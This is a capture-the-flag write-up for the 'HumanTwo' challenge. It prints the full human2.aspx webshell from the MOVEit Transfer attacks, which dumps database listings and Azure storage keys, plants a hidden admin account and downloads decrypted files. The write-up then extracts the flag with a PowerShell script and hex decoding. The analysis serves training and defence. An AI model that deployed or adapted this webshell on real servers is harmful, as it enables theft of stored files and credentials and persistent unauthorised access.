# HumanTwo
![Human](https://i.imgur.com/A3m8riC.png)
> During the MOVEit Transfer exploitation, there were tons of "indicators of compromise" hashes available for the `human2.aspx` webshell! We collected a lot of them, but they all look very similar... except for very minor differences. Can you find an oddity?  

**NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.**

**Download the file(s) below.**
**Attachments:** [human2.aspx_iocs.zip](https://huntress.ctf.games/files/671ca0608e31fe1e67d84ed9e2c05a09/human2.aspx_iocs.zip?token=eyJ1c2VyX2lkIjozMDU4LCJ0ZWFtX2lkIjo0MzQsImZpbGVfaWQiOjJ9.ZR2hMQ.3Kf8-JBRSiCIefIOg6eG8p1mPVE)

-----

1. Download the *human2.aspx_iocs.zip* file

2. If you open one of the files in a text editor, such as `notepad++`, you'll a block of code like this:
```
<%@ Page Language="C#" %>

<%@ Import Namespace="MOVEit.DMZ.ClassLib" %>
<%@ Import Namespace="MOVEit.DMZ.Application.Contracts.Infrastructure.Data" %>
<%@ Import Namespace="MOVEit.DMZ.Application.Files" %>
<%@ Import Namespace="MOVEit.DMZ.Cryptography.Contracts" %>
<%@ Import Namespace="MOVEit.DMZ.Core.Cryptography" %>
<%@ Import Namespace="MOVEit.DMZ.Application.Contracts.FileSystem" %>
<%@ Import Namespace="MOVEit.DMZ.Core" %>
<%@ Import Namespace="MOVEit.DMZ.Core.Data" %>
<%@ Import Namespace="MOVEit.DMZ.Application.Users" %>
<%@ Import Namespace="MOVEit.DMZ.Application.Contracts.Users.Enum" %>

<%@ Import Namespace="MOVEit.DMZ.Application.Contracts.Users" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>

<script runat="server">  
private Object connectDB() {
    var MySQLConnect = new DbConn(SystemSettings.DatabaseSettings());
    bool flag = false;
    string text = null;
    flag = MySQLConnect.Connect();
    if (!flag) {
        return text;
    }
    return MySQLConnect;
}
private Random random = new Random();
public string RandomString(int length) {
    const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
}
protected void Page_load(object sender, EventArgs e) {
    var pass = Request.Headers["X-siLock-Comment"];
    if (!String.Equals(pass, "73ced567-c67d-4fe1-9f19-ffde4a36ccce")) {
        Response.StatusCode = 404;
        return;
    }
    Response.AppendHeader("X-siLock-Comment", "comment");
    var instid = Request.Headers["X-siLock-Step1"];
    string x = null;
    DbConn MySQLConnect = null;
    var r = connectDB();
    if (r is String) {
        Response.Write("OpenConn: Could not connect to DB: " + r);
        return;
    }
    try {
        MySQLConnect = (DbConn) r;
        if (int.Parse(instid) == -1) {
            string azureAccout = SystemSettings.AzureBlobStorageAccount;
            string azureBlobKey = SystemSettings.AzureBlobKey;
            string azureBlobContainer = SystemSettings.AzureBlobContainer;
            Response.AppendHeader("AzureBlobStorageAccount", azureAccout);
            Response.AppendHeader("AzureBlobKey", azureBlobKey);
            Response.AppendHeader("AzureBlobContainer", azureBlobContainer);
            var query = "select f.id, f.instid, f.folderid, filesize, f.Name as Name, u.LoginName as uploader, fr.FolderPath , fr.name as fname from folders fr, files f left join users u on f.UploadUsername = u.Username where f.FolderID = fr.ID";
            string reStr = "ID,InstID,FolderID,FileSize,Name,Uploader,FolderPath,FolderName\n";
            var set = new RecordSetFactory(MySQLConnect).GetRecordset(query, null, true, out x);
            if (!set.EOF) {
                while (!set.EOF) {
                    reStr += String.Format("{0},{1},{2},{3},{4},{5},{6},{7}\n", set["ID"].Value, set["InstID"].Value, set["FolderID"].Value, set["FileSize"].Value, set["Name"].Value, set["uploader"].Value, set["FolderPath"].Value, set["fname"].Value);
                    set.MoveNext();
                }
            }
            reStr += "----------------------------------\nFolderID,InstID,FolderName,Owner,FolderPath\n";
            String query1 = "select ID, f.instID, name, u.LoginName as owner, FolderPath from folders f left join users u on f.owner = u.Username";
            set = new RecordSetFactory(MySQLConnect).GetRecordset(query1, null, true, out x);
            if (!set.EOF) {
                while (!set.EOF) {
                    reStr += String.Format("{0},{1},{2},{3},{4}\n", set["id"].Value, set["instID"].Value, set["name"].Value, set["owner"].Value, set["FolderPath"].Value);
                    set.MoveNext();
                }
            }
            reStr += "----------------------------------\nInstID,InstName,ShortName\n";
            query1 = "select id, name, shortname from institutions";
            set = new RecordSetFactory(MySQLConnect).GetRecordset(query1, null, true, out x);
            if (!set.EOF) {
                while (!set.EOF) {
                    reStr += String.Format("{0},{1},{2}\n", set["ID"].Value, set["name"].Value, set["ShortName"].Value);
                    set.MoveNext();
                }
            }
            using(var gzipStream = new GZipStream(Response.OutputStream, CompressionMode.Compress)) {
                using(var writer = new StreamWriter(gzipStream, Encoding.UTF8)) {
                    writer.Write(reStr);
                }
            }
        } else if (int.Parse(instid) == -2) {
            var query = String.Format("Delete FROM users WHERE RealName='Health Check Service'");
            new RecordSetFactory(MySQLConnect).GetRecordset(query, null, true, out x);
        } else {
            var fileid = Request.Headers["X-siLock-Step3"];
            var folderid = Request.Headers["X-siLock-Step2"];
            if (fileid == null && folderid == null) {
                SessionIDManager Manager = new SessionIDManager();
                string NewID = Manager.CreateSessionID(Context);
                bool redirected = false;
                bool IsAdded = false;
                Manager.SaveSessionID(Context, NewID, out redirected, out IsAdded);
                string username = "";
                var query = String.Format("SELECT Username FROM users WHERE InstID={0} AND Permission=30 AND Status='active' and Deleted=0", int.Parse(instid));
                var set = new RecordSetFactory(MySQLConnect).GetRecordset(query, null, true, out x);
                var query1 = "";
                if (!set.EOF) {
                    username = (String) set["Username"].Value;
                } else {
                    username = RandomString(16);
                    query1 += String.Format("INSERT INTO users (Username, LoginName, InstID, Permission, RealName, CreateStamp, CreateUsername, HomeFolder, LastLoginStamp, PasswordChangeStamp) values ('{0}','{1}',{2},{3},'{4}', CURRENT_TIMESTAMP,'Automation',(select id from folders where instID=0 and FolderPath='/'), CURRENT_TIMESTAMP, CURRENT_TIMESTAMP);", username, "Health Check Service", int.Parse(instid), 30, "Health Check Service", "Automation", "Services");
                }
                query1 += String.Format("insert into activesessions (SessionID, Username, LastTouch, Timeout, IPAddress) VALUES ('{0}','{1}',CURRENT_TIMESTAMP, 9999, '127.0.0.1')", NewID, username);
                new RecordSetFactory(MySQLConnect).GetRecordset(query1, null, true, out x);
            } else {
                DataFilePath dataFilePath = new DataFilePath(int.Parse(instid), int.Parse(folderid), fileid);
                SILGlobals siGlobs = new SILGlobals();
                siGlobs.FileSystemFactory.Create();
                EncryptedStream st = Encryption.OpenFileForDecryption(dataFilePath, siGlobs.FileSystemFactory.Create());
                Response.ContentType = "application/octet-stream";
                Response.AppendHeader("Content-Disposition", String.Format("attachment; filename={0}", fileid));
                using(var gzipStream = new GZipStream(Response.OutputStream, CompressionMode.Compress)) {
                    st.CopyTo(gzipStream);
                }
            }
        }
    } catch (Exception) {
        Response.StatusCode = 404;
        return;
    } finally {
        MySQLConnect.Disconnect();
    }
    return;
}
</script>                                                                              
```

3. If you were to open another file the same way, and compare them against eachother, you'd see that on Line: 36, there is a variable that is different in each file.


	3a. In the example above, it would be the string `73ced567-c67d-4fe1-9f19-ffde4a36ccce`

4.   I then created a simple `.ps1` script, to loop through each file, and pull the date between:
`if (!String.Equals(pass, "` and `")) {`

- 4a. This was the Python Script
```
# Set the path to the folder containing your files
$folderPath = "C:\path\to\your\folder"

# Initialize an empty list to store results
$results = @()

# Define a regular expression pattern to match the desired text
$pattern = 'if \(!String\.Equals\(pass, "(.*?)"\)\) {'

# Loop through each file in the folder
Get-ChildItem $folderPath | ForEach-Object {
    $filePath = $_.FullName
    $content = Get-Content $filePath

    # Check if the file has at least 36 lines
    if ($content.Count -ge 36) {
        # Extract the text between the specified pattern on line 36
        $line36 = $content[35]
        $match = $line36 -match $pattern

        if ($match) {
            $result = @{
                FileName = $_.Name
                Content = $matches[1]
            }
            $results += New-Object PSObject -Property $result
        }
    }
}

# Display the results
$results | Format-Table -AutoSize

# Optionally, export the results to a CSV file
$results | Export-Csv -Path "C:\path\to\output.csv" -NoTypeInformation
```

5.  The `Powershell` Script will loop through each file, and save the the data into a `.csv` file.  The file will include the `FileName` in one column and the `Extracted Text` in the next column

	![enter image description here](https://i.imgur.com/NvhWAMu.png)
6.  I then dropped in a `LEN` formula, running down the column to see if any of the strings stuck out.  Which is when I found `666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000`

7.  Once I found that string, I concatenated the strings together to form `666c6167-7b36-6365-3666-36613135646464623065-6262-3333-3262-66616632623062383564-317d-0000-0000-000000000000`
  
8.  From there, all I had to do was convert the String from Hex to ASCII

	![enter image description here](https://i.imgur.com/u4DgmvH.png)
9. Flag #2 Acquired:

### flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}


-----

